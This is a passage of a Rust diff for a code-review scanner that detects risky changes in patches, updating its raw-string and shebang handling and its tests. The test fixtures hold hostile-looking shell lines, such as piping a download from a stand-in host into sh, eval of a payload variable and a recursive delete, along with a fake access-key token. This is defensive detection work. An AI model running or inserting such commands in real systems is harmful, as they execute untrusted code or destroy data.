+///
+/// A raw string opened with `n` `#` ends at the first quote that at least `n` `#` follow, and
+/// its own text may hold any quote with fewer: `href="#top"` in a string opened with two.
+/// So in a side that began inside one, the quote that closes it has more `#` after it than
+/// any quote before it in the side: it sets a record. The records of a side, in order, are
+/// therefore every quote that can be that closing quote, and a reading from inside a raw
+/// string with the count of a record ends the string at that record's quote. One reading
+/// for each record is exact for every count the string can have been opened with. The
+/// quotes are taken from the text as it stands, not from any reading of it: a reading from
+/// the wrong start can have the closing quote inside a comment or a character literal.
+///
+/// Sides of real code have one record or two (measured: see the changelog). A side written
+/// to have many (`"#`, then `"##`, then `"###`, …) is read for its first [`RAW_STARTS`]
+/// records and no further, so that its cost stays that many readings: a raw string that
+/// ends at a later record is a declared miss.
+///
+/// Until 2026-11-15 the count was that of the first quote of the side with any `#`, which
+/// is the first record only: a hunk of a plain `git diff` that began inside `r##"…"##`
+/// whose text held `href="#top"` and a URL lost every item after the string (seventh
+/// independent review, IR7-M-1).
+fn quote_hash_records(texts: &[&str]) -> Vec<usize> {
+    let mut records = Vec::new();
+    let mut most = 0;
+    for text in texts {
+        let bytes = text.as_bytes();
+        let mut at = 0;
+        while let Some(quote) = bytes[at..].iter().position(|byte| *byte == b'"') {
+            let after = at + quote + 1;
+            let hashes = bytes[after..]
                 .iter()
                 .take_while(|byte| **byte == b'#')
-                .count(),
-        )
-    })
+                .count();
+            if hashes > most {
+                most = hashes;
+                records.push(hashes);
+                if records.len() == RAW_STARTS {
+                    return records;
+                }
+            }
+            at = after + hashes;
+        }
+    }
+    records
 }
 
 /// One item one reading of a text found: on the line at `at` of the text (in what
@@ -1426,17 +1670,19 @@ struct Hit {
 ///   (the review of the port of the scanner to the released line, LF-H-1).
 /// - **From inside a raw string**, on the same condition, when the side holds a quote with `#`
 ///   straight after it. A raw string takes no escapes, and ends at the first quote that as
-///   many `#` follow as opened it. The count is that of the first such quote of the side
-///   ([`first_quote_hashes`]): in a side that began in a raw string it is the string's
-///   closing quote unless the string's own text holds a quote and `#`, so the reading is
-///   right for any count without one reading for each. (Read as an ordinary string, a raw
-///   string whose text ends in a backslash does not end at its closing quote.)
+///   many `#` follow as opened it; its own text may hold quotes with fewer. So the quote
+///   that closes the string a side began in has more `#` after it than any quote before it,
+///   and the side is read once for each such record ([`quote_hash_records`], at most
+///   [`RAW_STARTS`] readings): each is right for the counts that end at its quote. (Read as
+///   an ordinary string, a raw string whose text ends in a backslash does not end at its
+///   closing quote.)
 ///
 /// Every hunk of a Rust file is read once more as release 0.8.3 read it ([`released_hits`]).
 ///
 /// What no reading covers is in the module `rust_tokens`: a side that begins two or more
 /// comments deep; one that begins in a string and carries nothing over a line end when read
-/// from code; a raw string whose text holds a quote followed by `#`.
+/// from code; a raw string opened with no `#` whose closing quote follows a backslash; a raw
+/// string that ends at a later record than the readings go to.
 ///
 /// The hint `test_likely` of a panic path is the one the reading from code gives when that
 /// reading finds it; when only other readings find it, it has the hint only if each of them
@@ -1478,16 +1724,18 @@ fn text_hits(
 
 /// The further starts of one side of a Rust text, in the order they are read; `carries` says
 /// that its reading from code has something open over a line end. See [`text_hits`].
-fn further_starts(side: &RustText, carries: bool) -> [Option<RustStart>; 4] {
+fn further_starts(side: &RustText, carries: bool) -> [Option<RustStart>; 3 + RAW_STARTS] {
     let in_string = side.fragment && carries;
-    [
-        (side.fragment && rust_shebang(&side.texts)).then_some(RustStart::FileStart),
-        side.fragment.then_some(RustStart::Comment),
-        in_string.then_some(RustStart::Str),
-        first_quote_hashes(&side.texts)
-            .filter(|_| in_string)
-            .map(RustStart::RawStr),
-    ]
+    let mut starts = [None; 3 + RAW_STARTS];
+    starts[0] = (side.fragment && rust_shebang(&side.texts)).then_some(RustStart::FileStart);
+    starts[1] = side.fragment.then_some(RustStart::Comment);
+    starts[2] = in_string.then_some(RustStart::Str);
+    if in_string {
+        for (start, hashes) in starts[3..].iter_mut().zip(quote_hash_records(&side.texts)) {
+            *start = Some(RustStart::RawStr(hashes));
+        }
+    }
+    starts
 }
 
 /// What two readings found, each in line order and then signal order, as one list in that
@@ -1561,7 +1809,13 @@ fn view_matches(
     let views = &reading.lines;
     let next_on = |side: Side, at: usize| next_line_on(lines, views, side, at);
     let tokens = if language == Some(Language::Rust) {
-        rust_tokens::read_hunk(lines, views, reading.old, reading.new)
+        // The end of a side is an edge in every reading; its beginning only in the reading
+        // from code (in another, the first tokens are not the first of the side).
+        let edges = rust_tokens::Edges {
+            start: from_code,
+            end: true,
+        };
+        rust_tokens::read_hunk(lines, views, reading.old, reading.new, edges)
     } else {
         rust_tokens::HunkItems::default()
     };
@@ -4876,12 +5130,11 @@ mod tests {
     fn hunk_signals_agree_with_file_evidence() {
         let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
         let file = parse(patch).unwrap().remove(0);
-        let per_hunk: Vec<Vec<EvidenceSignal>> = file
-            .patch_twin
-            .hunks
-            .iter()
-            .map(|h| hunk_signals(&file, h))
+        let per_hunk: Vec<Vec<EvidenceSignal>> = (0..file.patch_twin.hunks.len())
+            .map(|index| hunk_signals(&file, index).unwrap())
             .collect();
+        assert_eq!(hunk_signals(&file, 2), None);
+        assert_eq!(hunk_signals_alone(&file, 2), None);
         assert_eq!(
             per_hunk,
             [
@@ -5521,9 +5774,7 @@ mod tests {
         const LINES: usize = 150_000;
         let added = vec!["+    y.unwrap();"; LINES];
         let matches = |file: &ReviewFile| {
-            let kind = FileKind::of(file);
-            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
-            texts_found(&file.patch_twin.hunks, &texts(file), &kind, &rules, None)
+            file_found(file, &joined_texts(file), None)
                 .remove(0)
                 .iter()
                 .map(|hit| (hit.side, hit.signal, hit.number, hit.basis))
@@ -5721,7 +5972,6 @@ mod tests {
             "#[cfg_attr(miri, allow(ignore_me))]",
             "ass ert!(true)",
             "assert!(tru",
-            "assert!(true",
             "assert_ne!(true, true)",
             "assert_eq!(true)",
             "#[ignored]",
@@ -5736,6 +5986,19 @@ mod tests {
                 );
             }
         }
+        // An assertion cut after its `true` is no assertion in the middle of a side, and at
+        // the end of one it is the beginning of one: what stands after the side is not shown.
+        assert_eq!(
+            found(&hunk_of(
+                "tests/a.rs",
+                &["+    assert!(true", "+    == x);"]
+            )),
+            []
+        );
+        assert_eq!(
+            found(&hunk_of("tests/a.rs", &["+    assert!(true"])),
+            [(S::TrivialAssert, Basis::Hunk, 2)]
+        );
         // the one rule left that passes over spaces on a line: `# [allow(`
         assert!(spaced("# [ allow (x)]", &["#"], &["[allow("]));
         assert!(!spaced("", &["#"], &["[allow("]) && !spaced("#[allow(", &[], &["[allow("]));
@@ -6343,25 +6606,43 @@ mod tests {
     /// The spawn the placement tests hide: one line of Rust that starts a process.
     const SPAWN: &str = r#"pub fn evil() { std::process::Command::new("sh").status().ok(); }"#;
 
-    /// Sixth independent review, IR6-H-1. The top of a file is where Git must put the hunk,
-    /// which the OLD position decides, never the new one. Plain `git apply` 2.56.0, in scratch
-    /// repositories (a file of lines `l1` to `l6` unless said otherwise):
+    /// Sixth independent review, IR6-H-1, and the seventh, IR7-L-3. The top of a file is where
+    /// Git must put the hunk, and one thing in a header says that it must: an OLD position of
+    /// 0 or 1. Plain `git apply` 2.56.0, in scratch repositories.
     ///
-    /// - `@@ -1,2 +9,3 @@` with the context `l1`, `l2`: "Hunk #1 succeeded at 1 (offset -8
-    ///   lines)". The new position is not used.
-    /// - `@@ -1,2 +1,3 @@` with the context `l4`, `l5`: "patch does not apply". Old position 1
-    ///   must match at the beginning.
+    /// Where Git looks for a hunk: it searches for the hunk's old lines starting at the NEW
+    /// position and going outward, and takes the nearest place that has them. A file whose
+    /// lines 1 to 4 and 9 to 12 are the same four lines, and a hunk of those four lines with
+    /// one line added:
+    ///
+    /// - `@@ -9,4 +1,5 @@`: applied at line 1, with no message. `@@ -2,4 +9,5 @@`: applied at
+    ///   line 9, with no message. `@@ -30,4 +6,5 @@`: "Hunk #1 succeeded at 9 (offset 3
+    ///   lines)", the nearer of the two places to line 6.
+    /// - `@@ -1,4 +9,5 @@` and `@@ -0,4 +9,5 @@`: "Hunk #1 succeeded at 1 (offset -8 lines)".
+    ///   Old position 0 or 1 is the beginning, whatever the new position says.
+    ///
+    /// The same hunk on a file that has the four lines at 9 to 12 only:
+    ///
+    /// - `@@ -9,4 +1,5 @@` (the sixth review's `lie1.patch`): "succeeded at 9 (offset 8
+    ///   lines)". `@@ -40,4 +40,5 @@`: "succeeded at 9 (offset -31 lines)".
+    /// - `@@ -1,4 +9,5 @@`: "patch does not apply". Old position 1 must match at the beginning.
+    ///
+    /// A file of the lines `l1` to `l6`:
+    ///
     /// - `@@ -0,2 +1,3 @@` with the context `l4`, `l5`: refused. So must old position 0.
     /// - `@@ -1,0 +2,1 @@` (one added line): refused on a file that has lines, and on an empty
     ///   file "succeeded at 1": with no old line the hunk must match at the beginning and at
     ///   the end, which only an empty file lets it.
     /// - `@@ -0,0 +1,1 @@` on a file that has lines: refused.
-    /// - `@@ -9,4 +1,5 @@` (the review's `lie1.patch`): "succeeded at 9 (offset 8 lines)".
     /// - `@@ -3,2 +3,3 @@` with the context `l1`, `l2`: "succeeded at 1 (offset -2 lines)".
     ///   A hunk that says it is lower is put at the top when its old lines are there.
     ///
     /// So a hunk with old position 0 or 1 is at the beginning of its file or not applied, and
-    /// a hunk with another old position is wherever its old lines are.
+    /// a hunk with another old position is wherever its old lines are nearest to its new
+    /// position: at the top too, and then nothing in its header says so. (Round 14 wrote
+    /// here that the old position decides the place and that "the new position is not used".
+    /// The first is true of positions 0 and 1 only, and the second is false: Git starts at
+    /// the new position. The rule under test was right and has not changed.)
     #[test]
     fn the_top_of_a_file_is_where_git_must_put_the_hunk() {
         let hunk = |header: &str, body: &str| {
@@ -6371,7 +6652,8 @@ mod tests {
         };
         let spawn = |line: u32| vec![(S::ProcessSpawn, Basis::Lexical, line)];
         // `lie1.patch`: a line added inside an existing block comment, in a hunk whose header
-        // says `+1`. Its control says `+9`. Both are found: the old position is 9.
+        // says `+1`. Its control says `+9`. Both are found: the old position is 9, so
+        // neither header says the hunk must be the top.
         let inside = format!(" pub fn h() {{}}\n pub fn i() {{}}\n+// */ {SPAWN} /*\n */\n");
         assert_eq!(hunk("@@ -9,3 +9,4 @@", &inside), spawn(11));
         assert_eq!(hunk("@@ -9,3 +1,4 @@", &inside), spawn(3));
@@ -6467,8 +6749,9 @@ mod tests {
     ///   second hunk is line 14, straight after the added line of the first.
     /// - Two hunks that touch, `@@ -3,2 +3,3 @@` (`l3`, added, `l4`) and `@@ -5,2 +6,3 @@`
     ///   (`l5`, added, `l6`): accepted. The same with the second header `@@ -11,2 +30,3 @@`:
-    ///   "Hunk #2 succeeded at 6 (offset -24 lines)". The old position of a hunk that has
-    ///   context does not say where it is.
+    ///   "Hunk #2 succeeded at 6 (offset -24 lines)". Git looked from line 30 and found the
+    ///   lines at 6: neither number of a hunk that has context says where it is (seventh
+    ///   independent review, IR7-L-3: the search starts at the new one).
     /// - Hunks in the other order (lines 8 and 9 first, then lines 2 and 3): accepted.
     /// - A second hunk whose first context line is the last context line of the first:
     ///   refused.
@@ -6533,7 +6816,7 @@ mod tests {
         }));
         assert_eq!(texts(&many).len(), 21);
         assert_eq!(texts(&many)[20].hunks, (0..20).collect::<Vec<_>>());
-        assert_eq!(joined_hunks(&many).len(), 20);
+        assert_eq!(joined_hunks(&many), [true; 20]);
         // a hunk Git must put after one that the positions join to an earlier one: alone,
         // with the hunk before it, and with both
         let three = existing(
@@ -6546,7 +6829,10 @@ mod tests {
                 text(&[1]),
                 text(&[2]),
                 text(&[1, 2]),
-                text(&[0, 1, 2])
+                text(&[0, 1, 2]),
+                // and by the numbers alone, for an applier that puts the third where its
+                // numbers say and not at the end of the file
+                text(&[0, 1])
             ]
         );
     }
@@ -6681,10 +6967,10 @@ mod tests {
                 new += part.len() + context;
             }
             let file = parse(&patch).unwrap().remove(0);
-            let kind = FileKind::of(&file);
+            let kind = FileKind::readings(&file).remove(0);
             let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
             let hunks = &file.patch_twin.hunks;
-            joined += joined_hunks(&file).len();
+            joined += joined_hunks(&file).iter().filter(|joined| **joined).count();
             let of_file = file_evidence(&file);
             for (index, hunk) in hunks.iter().enumerate() {
                 let lines: Vec<&PatchLine> = hunk.lines.iter().collect();
@@ -6712,7 +6998,17 @@ mod tests {
     /// scanner and its rules for a Rust file, and for any other by the shared scanner and
     /// the rules of the signals it had.
     fn listed_by_release_0_8_3(file: &ReviewFile) -> Vec<(HunkId, Side, S, u32)> {
-        let kind = FileKind::of(file);
+        // the language as that release decided it (`FileKind::of` at commit `d4dbc91`): by
+        // the extension, or by a shebang on the first line of the new side of the first
+        // hunk when its header says that side starts at line 1
+        let first_line = file
+            .patch_twin
+            .hunks
+            .first()
+            .filter(|h| h.new_start == Some(1))
+            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
+            .map(|l| l.text.as_str());
+        let kind = FileKind::with(&file.path, Language::of(&file.path, first_line));
         let mut listed = Vec::new();
         for hunk in &file.patch_twin.hunks {
             let hits = if kind.language == Some(Language::Rust) {
@@ -7030,7 +7326,7 @@ mod tests {
         .remove(0);
         let hunks = &file.patch_twin.hunks;
         let evidence = file_evidence(&file);
-        for hunk in hunks {
+        for (index, hunk) in hunks.iter().enumerate() {
             let of_file: Vec<EvidenceSignal> = EvidenceSignal::ALL
                 .into_iter()
                 .filter(|signal| {
@@ -7039,16 +7335,13 @@ mod tests {
                         .any(|e| e.hunk == hunk.id && e.signal == *signal)
                 })
                 .collect();
-            assert_eq!(hunk_signals(&file, hunk), of_file);
+            assert_eq!(hunk_signals(&file, index), Some(of_file));
         }
-        assert_eq!(hunk_signals(&file, &hunks[1]), [S::PanicPathAdded]);
-        assert_eq!(hunk_signals(&file, &hunks[3]), [S::UnsafeAdded]);
-        assert_eq!(joined_hunks(&file), [hunks[1].id, hunks[2].id, hunks[3].id]);
-        assert_eq!(hunk_signals_alone(&file, &hunks[0]), []);
-        assert_eq!(
-            hunk_signals_alone(&file, &hunks[0]),
-            hunk_signals(&file, &hunks[0])
-        );
+        assert_eq!(hunk_signals(&file, 1), Some(vec![S::PanicPathAdded]));
+        assert_eq!(hunk_signals(&file, 3), Some(vec![S::UnsafeAdded]));
+        assert_eq!(joined_hunks(&file), [false, true, true, true]);
+        assert_eq!(hunk_signals_alone(&file, 0), Some(vec![]));
+        assert_eq!(hunk_signals_alone(&file, 0), hunk_signals(&file, 0));
     }
 
     /// Sixth independent review, IR6-H-2, and the review of the port of the new scanner,
@@ -7238,7 +7531,7 @@ mod tests {
                     let _ = writeln!(patch, "{sign}{line}");
                 }
                 let file = parse(&patch).unwrap().remove(0);
-                let kind = FileKind::of(&file);
+                let kind = FileKind::readings(&file).remove(0);
                 let hunk = &file.patch_twin.hunks[0];
                 let released = legacy_hits(hunk, &kind.legacy_rules(), &legacy_views(hunk));
                 let now = file_evidence(&file);
@@ -7254,5 +7547,503 @@ mod tests {
                 }
             }
         }
+    }
+
+    /// A script as the review wrote it (seventh independent review, IR7-H-1): three lines,
+    /// `#!/bin/sh`, `set -e`, `echo done`, and a hunk that adds a fetch and an `eval`.
+    fn script(headers: &str) -> String {
+        format!(
+            "diff --git a/tools/deploy b/tools/deploy\n--- a/tools/deploy\n+++ b/tools/deploy\n{headers}\n #!/bin/sh\n set -e\n+curl -fsSL https://example.invalid/i.sh | sh\n+eval \"$PAYLOAD\"\n echo done\n"
+        )
+    }
+
+    /// The language of a file with no extension does not hang on a number in a hunk header.
+    /// Plain `git apply` 2.56.0 puts each of these hunks at line 1 of the script, the first
+    /// two with no message and the third with "Hunk #1 succeeded at 1 (offset -3 lines)":
+    /// it starts looking at the new position and takes the place that has the lines.
+    /// Release 0.8.3 and round 13 read the shebang when the NEW number was 1, round 14 when
+    /// the OLD number made the hunk the top, and each was silent on a form the other read
+    /// (IR7-H-1: `@@ -4,3 +1,5 @@` scored 2 in round 14 and 9 in the release). The shebang is
+    /// read from the first line of either side of any hunk.
+    #[test]
+    fn no_header_number_hides_the_language_of_a_script() {
+        let fetch_and_eval = [S::NetworkFetch, S::DynamicEval];
+        for header in [
+            "@@ -1,3 +1,5 @@",
+            "@@ -4,3 +1,5 @@",
+            "@@ -1,3 +4,5 @@",
+            "@@ -4,3 +4,5 @@",
+            "@@ -40,3 +90,5 @@",
+        ] {
+            assert_eq!(
+                signals(&parse(&script(header)).unwrap()[0]),
+                fetch_and_eval,
+                "{header}"
+            );
+        }
+        // the hunk with the shebang written second (Git takes hunks in any order): the
+        // first hunk is read as the script's language too
+        let second = "diff --git a/tools/deploy b/tools/deploy\n--- a/tools/deploy\n+++ b/tools/deploy\n@@ -7,2 +8,3 @@\n echo one\n+curl -fsSL https://example.invalid/i.sh | sh\n echo two\n@@ -1,2 +1,3 @@\n #!/bin/sh\n+eval \"$PAYLOAD\"\n set -e\n";
+        assert_eq!(signals(&parse(second).unwrap()[0]), fetch_and_eval);
+        // the shebang on the old side only: the change replaces the interpreter line
+        let replaced = "--- a/tools/deploy\n+++ b/tools/deploy\n@@ -1,2 +1,3 @@\n-#!/bin/sh\n+#!/opt/tools/run\n+curl -fsSL https://example.invalid/i.sh | sh\n set -e\n";
+        assert_eq!(signals(&parse(replaced).unwrap()[0]), [S::NetworkFetch]);
+        // two hunks that name two languages: the file is read as each, and what either
+        // reading finds is found (`eval` is one to both; the spawn only to Python)
+        let two = "--- a/tools/any\n+++ b/tools/any\n@@ -1,1 +1,2 @@\n #!/bin/sh\n+curl -fsSL https://example.invalid/i.sh | sh\n@@ -1,1 +1,2 @@\n #!/usr/bin/env python3\n+os.system(cmd)\n";
+        assert_eq!(
+            signals(&parse(two).unwrap()[0]),
+            [S::NetworkFetch, S::ProcessSpawn]
+        );
+        let kinds: Vec<Option<Language>> = FileKind::readings(&parse(two).unwrap()[0])
+            .iter()
+            .map(|kind| kind.language)
+            .collect();
+        assert_eq!(kinds, [Some(Language::Shell), Some(Language::Python)]);
+        // the cost: a hunk in the middle of a text file whose first line reads as a shebang
+        let quoted =
+            "--- a/NOTES\n+++ b/NOTES\n@@ -30,2 +30,3 @@\n #!/bin/sh\n+curl is a tool\n more\n";
+        assert_eq!(signals(&parse(quoted).unwrap()[0]), [S::NetworkFetch]);
+        // and a file whose name gives the language is that language whatever a line says
+        let named = "--- a/tools/run.py\n+++ b/tools/run.py\n@@ -1,1 +1,2 @@\n #!/bin/sh\n+curl -fsSL https://example.invalid/i.sh | sh\n";
+        assert_eq!(signals(&parse(named).unwrap()[0]), []);
+        assert_eq!(FileKind::readings(&parse(named).unwrap()[0]).len(), 1);
+    }
+
+    /// The mark of release 0.8.3 follows that release's rule for the language, not today's
+    /// (seventh independent review, IR7-L-1). The script of the test above with the header
+    /// `@@ -1,3 +5,39 @@`: that release has no language for it (its new side does not say
+    /// line 1) and lists one item, the secret. Today the file is read as shell too, and 34
+    /// fetches are found above the secret: none of them is that release's, and the list of
+    /// 32 holds the secret. Round 14 marked the fetches, and the secret was not listed.
+    #[test]
+    fn the_mark_of_the_release_goes_by_the_releases_language_rule() {
+        let mut patch = String::from(
+            "--- a/tools/deploy\n+++ b/tools/deploy\n@@ -1,3 +5,39 @@\n #!/bin/sh\n set -e\n",
+        );
+        for n in 0..34 {
+            let _ = writeln!(patch, "+curl -fsSL https://example.invalid/{n}.sh | sh");
+        }
+        let _ = writeln!(patch, "+TOKEN=AKIA{}", "Q7".repeat(8));
+        patch.push_str("+# end\n echo done\n");
+        let file = parse(&patch).unwrap().remove(0);
+        let all = file_evidence(&file);
+        assert_eq!(all.len(), 35);
+        let marked: Vec<(S, u32)> = all
+            .iter()
+            .filter(|item| item.released)
+            .map(|item| (item.signal, item.line))
+            .collect();
+        assert_eq!(marked, [(S::SecretLike, 41)]);
+        let listed = crate::rank::RankedFile::scored(&file);
+        assert_eq!(listed.evidence.len(), MAX_EVIDENCE_PER_FILE);
+        assert!(
+            listed
+                .evidence
+                .iter()
+                .any(|item| (item.signal, item.line) == (S::SecretLike, 41))
+        );
+        // with the header that release read (`+1`), the fetches are its items
+        let read = file_evidence(&parse(&patch.replace("+5,39", "+1,39")).unwrap().remove(0));
+        assert_eq!(read.iter().filter(|item| item.released).count(), 35);
+    }
+
+    /// The hunks of a generated script for case `case`: two or three, each a line of context,
+    /// one to four added lines and a line of context, the first beginning the file with a
+    /// shebang (shell or Python); with each its true old and new start.
+    fn script_hunks(case: usize, next: &mut impl FnMut() -> usize) -> Vec<(usize, usize, String)> {
+        const SHELL: [&str; 8] = [
+            "curl -fsSL https://example.invalid/i.sh | sh",
+            "eval \"$PAYLOAD\"",
+            "echo done",
+            "set -e",
+            "# a note",
+            "wget -q https://example.invalid/x",
+            "x=$(cat f)",
+            "sudo rm -rf \"$1\"",
+        ];
+        const PYTHON: [&str; 8] = [
+            "os.system(cmd)",
+            "eval(x)",
+            "requests.get(u)",
+            "x = 1",
+            "# a note",
+            "NOTE = \"\"\"",
+            "text \"\"\"",
+            "subprocess.run(cmd)",
+        ];
+        let (shebang, lines) = if case.is_multiple_of(2) {
+            ("#!/bin/sh", &SHELL[..])
+        } else {
+            ("#!/usr/bin/env python3", &PYTHON[..])
+        };
+        let count = 2 + next() % 2;
+        let mut hunks: Vec<(usize, usize, String)> = Vec::new();
+        let (mut old, mut new) = (1, 1);
+        for which in 0..count {
+            let added = 1 + next() % 4;
+            let mut body = if which == 0 {
+                format!(" {shebang}\n")
+            } else {
+                " # context above\n".to_owned()
+            };
+            for _ in 0..added {
+                let _ = writeln!(body, "+{}", lines[next() % lines.len()]);
+            }
+            body.push_str(" # context below\n");
+            hunks.push((old, new, body));
+            old += 2 + 5;
+            new += 2 + added + 5;
+        }
+        hunks
+    }
+
+    /// The items of `file` as places that no number is part of: the text of the hunk, the
+    /// line within it, the signal.
+    fn places(file: &ReviewFile) -> std::collections::BTreeSet<(String, usize, S)> {
+        let all = file_evidence(file);
+        let mut out = std::collections::BTreeSet::new();
+        for hunk in &file.patch_twin.hunks {
+            let body: String = hunk.lines.iter().map(|l| l.text.as_str()).collect();
+            for item in all.iter().filter(|item| item.hunk == hunk.id) {
+                let at = hunk
+                    .lines
+                    .iter()
+                    .position(|l| l.new_line == Some(item.line))
+                    .unwrap();
+                out.insert((body.clone(), at, item.signal));
+            }
+        }
+        out
+    }
+
+    /// No number in a header takes away an item that release 0.8.3 reports, in a file with
+    /// no extension as in any other: generated scripts (shell and Python by their shebang),
+    /// cut into hunks with context around each change, with the true numbers, with every
+    /// number replaced by one the generator picks, and with the hunks in another order.
+    /// Held: what that release finds in each hunk under ITS rule for the language is found
+    /// and is what is marked; and whatever the true numbers give is given under any others
+    /// (the floor property had no file without an extension and no false number in it:
+    /// IR7-L-4).
+    #[test]
+    fn false_numbers_take_nothing_away_from_a_script() {
+        let mut seed = 0x2026_1115_0007_u64;
+        let mut next = move || {
+            seed = seed
+                .wrapping_mul(6_364_136_223_846_793_005)
+                .wrapping_add(1_442_695_040_888_963_407);
+            (seed >> 33) as usize
+        };
+        let (mut found_more, mut silent_before) = (0, 0);
+        for case in 0..600 {
+            let hunks = script_hunks(case, &mut next);
+            let count = hunks.len();
+            let patch = |numbers: &dyn Fn(usize, usize) -> (usize, usize), order: &[usize]| {
+                let mut text = "--- a/tools/job\n+++ b/tools/job\n".to_owned();
+                for index in order {
+                    let (old, new, body) = &hunks[*index];
+                    let (old, new) = numbers(*old, *new);
+                    let rows = body.lines().count();
+                    let added = body.lines().filter(|line| line.starts_with('+')).count();
+                    let _ = write!(text, "@@ -{old},{} +{new},{rows} @@\n{body}", rows - added);
+                }
+                parse(&text).unwrap().remove(0)
+            };
+            let in_order: Vec<usize> = (0..count).collect();
+            let honest = patch(&|old, new| (old, new), &in_order);
+            let (shift_old, shift_new) = (next() % 50, next() % 50);
+            let reversed: Vec<usize> = in_order.iter().rev().copied().collect();
+            for (file, what) in [
+                (
+                    patch(&|old, new| (old + shift_old, new + shift_new), &in_order),
+                    "shifted",
+                ),
+                (patch(&|old, _| (old + 3, 1), &in_order), "new 1"),
+                (patch(&|_, new| (2, new + 3), &in_order), "old 2"),
+                (patch(&|old, new| (old, new), &reversed), "reversed"),
+                (
+                    patch(&|old, new| (old + shift_old, new + shift_new), &reversed),
+                    "both",
+                ),
+            ] {
+                // what the true numbers give is given under any others
+                let given = places(&file);
+                for item in places(&honest) {
+                    assert!(given.contains(&item), "case {case} {what}: {item:?}");
+                }
+                // what that release finds under its rule is found, and is what is marked
+                let key = |item: &Evidence| (item.hunk, item.side, item.signal, item.line);
+                let all = file_evidence(&file);
+                let released = listed_by_release_0_8_3(&file);
+                let marked: Vec<_> = all.iter().filter(|item| item.released).map(key).collect();
+                assert_eq!(marked, released, "case {case} {what}");
+                found_more += usize::from(all.len() > released.len());
+                silent_before += usize::from(released.is_empty() && !all.is_empty());
+            }
+        }
+        // the cases are of the kind that matters: files that release read as no language
+        assert!(
+            found_more > 500 && silent_before > 500,
+            "{found_more} {silent_before}"
+        );
+    }
+
+    /// The model of `git apply` that the joins on a hint rest on, and both hints (seventh
+    /// independent review, IR7-L-3 and IR7-M-2). Plain `git apply` 2.56.0 and
+    /// `git apply --unidiff-zero`, in scratch repositories:
+    ///
+    /// - A hunk of added lines only, `@@ -5,0 +6,1 @@`, on a file of 14 lines: plain Git,
+    ///   "Hunk #1 succeeded at 15 (offset 9 lines)" (the end of the file); with
+    ///   `--unidiff-zero`, line 6. The same with `@@ -5,0 +1,1 @@` and `--unidiff-zero`:
+    ///   line 1. There the NEW number places a hunk that has no old line.
+    /// - `@@ -2,0 +3,1 @@` and then `@@ -3,1 +4,1 @@` with true numbers (the review's
+    ///   `pq.patch`): plain Git refuses (it wants the first at the end), `--unidiff-zero`
+    ///   applies, and the added line and the changed line stand together.
+    /// - Two hunks with context that touch, the second written `@@ -40,2 +5,3 @@` (the
+    ///   review's `cutpair.patch`): accepted with no message; its new number is true.
+    ///
+    /// So hunks are read together when their old numbers say they touch and when their new
+    /// numbers do, and a hunk with no line on a side counts on that side as standing after
+    /// the line it names, before another hunk as after one.
+    #[test]
+    fn hunks_are_joined_on_the_hint_of_either_number() {
+        let text = |hunks: &[usize]| Text {
+            hunks: hunks.to_vec(),
+            top: false,
+        };
+        let existing = |hunks: &str| {
+            parse(&format!("--- a/src/m.rs\n+++ b/src/m.rs\n{hunks}"))
+                .unwrap()
+                .remove(0)
+        };
+        let call = [(S::PanicPathAdded, Basis::Hunk, 3)];
+        // `pq.patch`: a hunk with no old line, then the hunk at the next old line. (Plain
+        // Git would put the first at the end; that is the hunk alone.) Round 14 joined the
+        // pair only in the other order.
+        let pq = existing(
+            "@@ -2,0 +3,1 @@\n+    let v = opt.unwrap\n@@ -3,1 +4,1 @@\n-    let b = 2;\n+    (); let b = v;\n",
+        );
+        assert_eq!(texts(&pq), [text(&[0]), text(&[1]), text(&[0, 1])]);
+        assert_eq!(found(&pq), call);
+        let qp = existing(
+            "@@ -3,1 +4,1 @@\n-    let b = 2;\n+    (); let b = v;\n@@ -2,0 +3,1 @@\n+    let v = opt.unwrap\n",
+        );
+        // The same two written the other way round. Plain Git must put the second at the
+        // end, after the first (one text), and by the numbers the second stands before the
+        // first (another): each is read, and the second finds the call.
+        assert_eq!(
+            texts(&qp),
+            [text(&[0]), text(&[1]), text(&[0, 1]), text(&[1, 0])]
+        );
+        assert_eq!(found(&qp), call);
+        // `cutpair.patch`: the old number of the second hunk is false, the new one true
+        let cut = |second: &str| {
+            existing(&format!(
+                "@@ -1,2 +1,3 @@\n pub fn f(opt: Option<u32>) -> u32 {{\n+    let v = opt.unwrap\n \n{second}\n     ();\n+    let w = v;\n     w\n"
+            ))
+        };
+        let top = |hunks: &[usize]| Text {
+            hunks: hunks.to_vec(),
+            top: true,
+        };
+        for second in ["@@ -3,2 +4,3 @@", "@@ -40,2 +4,3 @@", "@@ -3,2 +50,3 @@"] {
+            let file = cut(second);
+            assert_eq!(
+                texts(&file),
+                [top(&[0]), text(&[1]), top(&[0, 1])],
+                "{second}"
+            );
+            assert_eq!(
+                found(&file),
+                [(S::PanicPathAdded, Basis::Hunk, 2)],
+                "{second}"
+            );
+        }
+        // both numbers false: nothing says they touch, and the join does not find the call
+        // (what stands at the edge of each half is another rule's matter)
+        assert_eq!(texts(&cut("@@ -40,2 +50,3 @@")), [top(&[0]), text(&[1])]);
+        // a hunk with no line on a side counts on that side as an earlier hunk: with the
+        // other number false, the pair is joined by that side alone (old: the added line
+        // stands after old line 2 and the second begins at old line 3; new: the removed
+        // line stands after new line 4 and the second begins at new line 5)
+        let by_old = existing(
+            "@@ -2,0 +3,1 @@\n+    let v = f(\n@@ -3,1 +44,1 @@\n-    let b = 2;\n+    g());\n",
+        );
+        assert_eq!(texts(&by_old), [text(&[0]), text(&[1]), text(&[0, 1])]);
+        let by_new =
+            existing("@@ -5,1 +4,0 @@\n-    gone();\n@@ -90,1 +5,2 @@\n l90\n+    here();\n");
+        assert_eq!(texts(&by_new), [text(&[0]), text(&[1]), text(&[0, 1])]);
+        // the two numbers name two different hunks: the hunk stands in a run for each, four
+        // texts at most
+        let both = existing(
+            "@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -13,2 +14,3 @@\n l13\n+b\n l14\n@@ -5,2 +17,3 @@\n l5\n+c\n l6\n",
+        );
+        assert_eq!(
+            texts(&both),
+            [
+                text(&[0]),
+                text(&[1]),
+                text(&[2]),
